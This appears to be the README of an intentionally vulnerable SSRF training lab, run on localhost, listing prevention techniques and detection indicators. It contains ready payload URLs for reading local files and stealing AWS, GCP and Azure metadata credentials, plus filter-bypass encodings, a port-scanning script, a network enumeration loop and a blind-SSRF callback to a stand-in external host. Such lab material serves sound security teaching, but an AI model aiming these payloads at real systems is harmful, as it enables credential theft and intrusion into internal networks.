# SSRF (Server-Side Request Forgery) Lab

## Description
This lab demonstrates Server-Side Request Forgery vulnerabilities where an attacker can make the server perform requests to internal or external resources. SSRF can lead to data exposure, internal network scanning, and cloud metadata access.

## Access
- **Main Application**: http://localhost:8091
- **Internal Service**: Only accessible from within the Docker network

## Vulnerability Details
The application accepts URLs from users and fetches their content, but fails to properly validate and restrict the URLs, allowing access to:
- Internal services
- Cloud metadata endpoints
- Local files (via file:// protocol)
- Internal network resources

## SSRF Attack Vectors

### 1. Internal Network Scanning
```bash
# Scan internal Docker network
http://localhost:8091/fetch?url=http://172.17.0.1:80
http://localhost:8091/fetch?url=http://internal-service:80
http://localhost:8091/fetch?url=http://ssrf-internal:80
```

### 2. Local File Access
```bash
# Read local files
http://localhost:8091/fetch?url=file:///etc/passwd
http://localhost:8091/fetch?url=file:///proc/self/environ
http://localhost:8091/fetch?url=file:///etc/hosts
```

### 3. Cloud Metadata Access (AWS)
```bash
# AWS metadata endpoint
http://localhost:8091/fetch?url=http://169.254.169.254/latest/meta-data/
http://localhost:8091/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://localhost:8091/fetch?url=http://169.254.169.254/latest/user-data/
```

### 4. Cloud Metadata Access (GCP)
```bash
# GCP metadata endpoint
http://localhost:8091/fetch?url=http://metadata.google.internal/computeMetadata/v1/
http://localhost:8091/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

### 5. Cloud Metadata Access (Azure)
```bash
# Azure metadata endpoint
http://localhost:8091/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 6. Internal Docker Services
```bash
# Docker internal DNS
http://localhost:8091/fetch?url=http://host.docker.internal:80

# Other containers in the network
http://localhost:8091/fetch?url=http://vulhub-manager:3000
```

### 7. Bypass Techniques

#### URL Encoding
```bash
# Encoded localhost
http://localhost:8091/fetch?url=http://127.0.0.1
http://localhost:8091/fetch?url=http://127.1
http://localhost:8091/fetch?url=http://2130706433  # Decimal IP
http://localhost:8091/fetch?url=http://0x7f000001  # Hex IP
```

#### DNS Rebinding
```bash
# Use a domain that resolves to internal IP
http://localhost:8091/fetch?url=http://localtest.me
```

#### URL Shorteners
```bash
# Create shortened URL pointing to internal resource
http://localhost:8091/fetch?url=http://bit.ly/[shortened-internal-url]
```

#### IPv6
```bash
# IPv6 localhost
http://localhost:8091/fetch?url=http://[::1]:80
http://localhost:8091/fetch?url=http://[0:0:0:0:0:0:0:1]:80
```

## Advanced Exploitation

### 1. Port Scanning Script
```python
import requests

target = "http://localhost:8091/fetch"
internal_ip = "172.17.0.1"

for port in [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 9200]:
    url = f"{target}?url=http://{internal_ip}:{port}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print(f"Port {port} is open")
    except:
        print(f"Port {port} is closed or filtered")
```

### 2. Internal Network Enumeration
```bash
# Scan Docker network range
for i in {1..255}; do
    curl "http://localhost:8091/fetch?url=http://172.17.0.$i"
done
```

### 3. Blind SSRF Detection
```bash
# Use external server to detect blind SSRF
http://localhost:8091/fetch?url=http://your-server.com/ssrf-test

# Use DNS lookup
http://localhost:8091/fetch?url=http://ssrf-test.your-domain.com
```

## Prevention Techniques (Not Implemented)

1. **URL Allowlisting**: Only allow specific, trusted domains
2. **Protocol Restrictions**: Limit to HTTP/HTTPS only
3. **IP Address Validation**: Block private IP ranges
4. **DNS Resolution Validation**: Resolve and validate before fetching
5. **Response Validation**: Check content-type and size limits
6. **Network Segmentation**: Isolate the application from internal services

## Common SSRF Indicators
- Requests to private IP addresses (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
- Requests to localhost (127.0.0.1, ::1)
- Requests to cloud metadata IPs (169.254.169.254)
- Unusual protocols (file://, gopher://, dict://)
- DNS queries for internal hostnames

## Tools for SSRF Testing
- **SSRFmap**: Automatic SSRF fuzzer
- **Gopherus**: Generate Gopher payloads
- **Burp Suite**: Manual testing with Collaborator
- **curl**: Quick command-line testing

## Real-World Impact
- Access to internal services and admin panels
- Reading sensitive files from the server
- Stealing cloud credentials from metadata
- Pivoting to internal network
- Denial of Service
- Remote Code Execution (in some cases) 